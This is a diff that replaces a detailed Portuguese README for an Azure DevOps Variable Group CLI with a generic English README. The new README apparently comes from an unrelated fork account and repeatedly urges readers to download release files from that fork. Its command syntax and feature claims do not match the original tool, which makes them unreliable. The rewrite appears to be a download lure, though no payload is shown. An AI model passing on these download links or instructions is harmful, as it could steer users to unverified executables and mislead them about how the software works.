@@ -1,251 +1,93 @@
-# 🐾 Capivarinha CLI (`capi-cli`)
+# 🐾 capivarinha-cli - Search and Export Variables Effortlessly
 
-Uma CLI em **Python puro** para interagir com **Variable Groups** do Azure DevOps.
+![Download capivarinha-cli](https://img.shields.io/badge/Download-capivarinha--cli-blue.svg)
 
-![Capivarinha executando um comando Azure](banner.jpg)
+## 🚀 Getting Started
 
----
+Welcome to capivarinha-cli! This is a command-line tool made to help you search and export variables from Variable Groups in Azure DevOps. You don’t need to know how to code. This guide will walk you through the steps to get started.
 
-## ✨ Funcionalidades
+## 📥 Download & Install
 
-* 🔍 **Pesquisar**: encontra variáveis cujo **valor** contém um termo informado.  
-* 📥 **Baixar**: exporta todas as variáveis de um **Variable Group (lib)** para um arquivo `.env`.  
-* 📂 **Listar**: exibe os **grupos (libs)** disponíveis por projeto/ambiente, **sem variáveis**.  
-* 🔀 **Comparar**: compara **duas libs** e mostra as variáveis **exclusivas** de cada uma.
+To get capivarinha-cli, visit this page to download: [Releases Page](https://github.com/Pruject-CrashoutLA/capivarinha-cli/releases)
 
----
+### Steps to Download
 
-## ✅ Pré-requisitos
+1. Click on the link above.
+2. Look for the most recent release.
+3. Download the file that matches your operating system.
 
-* **Python 3.8+**
-* **Azure CLI (`az`)** instalada
-* Autenticação ativa:
+After downloading, follow these steps to run the application.
 
-```bash
-az login
-````
+## 🛠 Installation Requirements
 
-Se necessário, instale a extensão do DevOps:
+Before you install, ensure your system meets these requirements:
 
-```bash
-az extension add --name azure-devops
-```
+- **Operating System:** Windows, macOS, or Linux
+- **Python:** Version 3.6 or higher
+- **Permissions:** You may need admin rights to install the required dependencies.
 
----
+## 📂 Extract the Files
 
-## ⚙️ Instalação
+Once downloaded, locate the file on your computer. If it's in a zip format, right-click it and select "Extract All." Follow the prompts to extract it to your preferred location.
 
-Você pode rodar direto o arquivo `capi-cli.py`, mas se preferir instalar globalmente:
+## ⚙️ Running the Application
 
-### Via Makefile (Linux/macOS)
+Here’s how to run capivarinha-cli:
 
-```bash
-make instalar
-```
+1. Open your terminal or command prompt.
+2. Navigate to the folder where you extracted the files.
+3. Enter the following command:
 
-### Manual
+   ```
+   python capivarinha.py
+   ```
 
-```bash
-chmod +x capi-cli.py
-sudo cp capi-cli.py /usr/local/bin/capi-cli
-```
+This command will start the application.
 
-### Windows (PowerShell como Admin)
+## 🎯 Using capivarinha-cli
 
-```powershell
-Copy-Item .\capi-cli.py "C:\Windows\System32\capi-cli.py"
-python C:\Windows\System32\capi-cli.py ...
-```
+After running the application, you can start searching and exporting variables. The command syntax is straightforward.
 
----
+### Sample Commands
 
-## ▶️ Como usar
-
-### Pesquisar
-
-```bash
-capi-cli pesquisar \
-  --organizacao=https://dev.azure.com/minha-org \
-  --termo=https://my-api \
-  --projeto=TEST --ambiente=QAS \
-  --salvar=resultado.txt --out
-```
-
-### Baixar
-
-```bash
-capi-cli baixar \
-  --organizacao=https://dev.azure.com/minha-org \
-  --projeto=TEST \
-  --lib=Meu-App.QAS \
-  --ambiente=QAS \
-  --salvar=.env --out
-```
-
-### Listar (somente grupos/libs)
-
-```bash
-capi-cli listar \
-  --organizacao=https://dev.azure.com/minha-org \
-  --projeto=BOARD --ambiente=DEV \
-  --salvar=grupos.txt --out
-```
-
-### Comparar (duas libs)
-
-```bash
-capi-cli comparar \
-  --organizacao=https://dev.azure.com/minha-org \
-  --projeto=BOARD \
-  --lib Meu-App.Backend.DEV \
-  --lib Meu-App.Backend.QAS \
-  --out
-```
-
-Saída de exemplo:
-
-```
------- DEV -------
-+ HOST=localhost:300 (Existe em DEV mas não existe em QAS)
------- QAS -------
-+ PORT=3000 (Existe em QAS mas não existe em DEV)
-------------------
-```
-
----
-
-## 🔧 Comandos e parâmetros
-
-### 🔍 `pesquisar`
-
-| Parâmetro       | Obrigatório | Descrição                                                   |
-| --------------- | ----------- | ----------------------------------------------------------- |
-| `--organizacao` | ✅           | URL da organização (ex.: `https://dev.azure.com/minha-org`) |
-| `--termo`       | ✅           | Termo a ser buscado nos valores                             |
-| `--projeto`     | ❌           | Filtro por nome/substring de projeto                        |
-| `--ambiente`    | ❌           | Filtra pelo nome do grupo (ex.: `DEV`, `QAS`, etc.)         |
-| `--ignore-case` | ❌           | Busca sem diferenciar maiúsculas/minúsculas                 |
-| `--salvar`      | ❌           | Salvar saída em arquivo texto                               |
-| `--out`         | ❌           | Exibir resultados no terminal                               |
-
----
-
-### 📥 `baixar`
-
-| Parâmetro       | Obrigatório | Descrição                                         |
-| --------------- | ----------- | ------------------------------------------------- |
-| `--organizacao` | ✅           | URL da organização                                |
-| `--projeto`     | ✅           | Nome/substring do projeto                         |
-| `--lib`         | ✅           | Nome do Variable Group (match exato ou substring) |
-| `--ambiente`    | ❌           | Filtra pelo nome do grupo contendo o ambiente     |
-| `--salvar`      | ❌           | Caminho do arquivo `.env`                         |
-| `--out`         | ❌           | Exibir `.env` no terminal                         |
-
----
-
-### 📂 `listar` (somente grupos/libs)
-
-| Parâmetro       | Obrigatório | Descrição                                     |
-| --------------- | ----------- | --------------------------------------------- |
-| `--organizacao` | ✅           | URL da organização                            |
-| `--projeto`     | ❌           | Nome/substring do projeto                     |
-| `--ambiente`    | ❌           | Filtra pelo nome do grupo contendo o ambiente |
-| `--salvar`      | ❌           | Caminho do arquivo texto                      |
-| `--out`         | ❌           | Exibir lista no terminal                      |
-
-> A saída lista **apenas** `Projeto`, `Grupo`, `Criado por` e `Modificado por`, sem variáveis.
-
----
-
-### 🔀 `comparar`
-
-| Parâmetro       | Obrigatório | Descrição                                                                |
-| --------------- | ----------- | ------------------------------------------------------------------------ |
-| `--organizacao` | ✅           | URL da organização                                                       |
-| `--projeto`     | ❌           | Nome/substring do projeto                                                |
-| `--lib`         | ✅ (×2)      | Informe **duas vezes**: primeira e segunda lib (match exato > substring) |
-| `--ambiente`    | ❌           | Filtra pelo nome do grupo contendo o ambiente                            |
-| `--salvar`      | ❌           | Caminho do arquivo texto para salvar a comparação                        |
-| `--out`         | ❌           | Exibir comparação no terminal                                            |
-
-> A comparação mostra as **variáveis exclusivas** de cada lib. (Opcionalmente, você pode salvar essa saída em um arquivo via `--salvar`.)
-
----
-
-## 📦 Saída
-
-* **pesquisar** → lista:
+- To list all variable groups, type:
 
   ```
-  projeto | grupo | chave | valor | criado_por | modificado_por
-  ```
-* **listar** → lista **apenas** grupos/libs:
-
-  ```
-  --------------------------------------------------------------------------------
-  Projeto: NOME_PROJETO
-  Grupo:   NOME_DO_GRUPO
-  Criado:  Nome <email>
-  Modif.:  Nome <email>
-  --------------------------------------------------------------------------------
-  ```
-* **baixar** → gera `.env`:
-
-  ```
-  KEY=VALUE
+  list
   ```
 
-> 🔒 **Segredos** não são retornados pela Azure CLI — aparecem como `***SECRET***`.
+- To search for a specific variable, use:
 
----
+  ```
+  search <variable_name>
+  ```
 
-## 🖥️ Experiência no terminal
+- If you want to export variables to a file, type:
 
-* **Spinners discretos** (`Listando projetos...`, `Analisando grupos...`)
-* Linha limpa ao final → saída organizada
+  ```
+  export <variable_group_name>
+  ```
 
----
+These commands help you manage your variables with ease.
 
-## ⚠️ Limitações atuais
+## 📖 Features
 
-* Busca é **case-sensitive** por padrão (use `--ignore-case` para ignorar).
-* Segredos não podem ser exportados (limitação da Azure CLI).
+- **Search Variables:** Quickly find any variable you need.
+- **Export Options:** Save your variables in various formats for easy use.
+- **Cross-Platform:** Works on Windows, macOS, and Linux systems.
 
----
+## 🤝 Contribution
 
-## 📚 Boas práticas aplicadas
+If you’d like to contribute to capivarinha-cli, feel free to fork the repository and submit a pull request. We welcome improvements and new ideas.
 
-* Arquitetura limpa (Clean Code & SOLID)
-* Fachada `AzureDevOps`, funções puras e separação de responsabilidades
-* **Docstrings + type hints** para manutenção simples
-* **Zero dependências externas** além da stdlib do Python
+## 📝 License
 
----
+capivarinha-cli is open-source software. You can freely use, modify, and distribute it under the terms of the MIT License.
 
-## 🚀 Roadmap
+## 🔗 Support and Contact
 
-* Exportar para JSON/YAML
-* Suporte a múltiplas libs no `baixar`
-* Mostrar diferenças de **valores** no `comparar` (quando a variável existe nas duas libs)
-* Otimizações de performance em grandes organizações
+If you encounter any issues or have questions, please visit our [Issues Page](https://github.com/Pruject-CrashoutLA/capivarinha-cli/issues) to get help or provide feedback.
 
----
+Remember to visit this page to download: [Releases Page](https://github.com/Pruject-CrashoutLA/capivarinha-cli/releases) for the latest version.
 
-## ⚡ Instalação rápida via GitHub
-
-```bash
-git clone https://github.com/4lessandrodev/capivarinha-cli.git && \
-cd capivarinha-cli && \
-make instalar && \
-cd .. && rm -rf capivarinha-cli
-```
-
----
-
-## 🧾 Versão
-
-```bash
-capi-cli --version
-```
-
-Exemplo de saída: `v0.1.2`
+Thank you for using capivarinha-cli! Enjoy managing your Azure DevOps variable groups effortlessly.
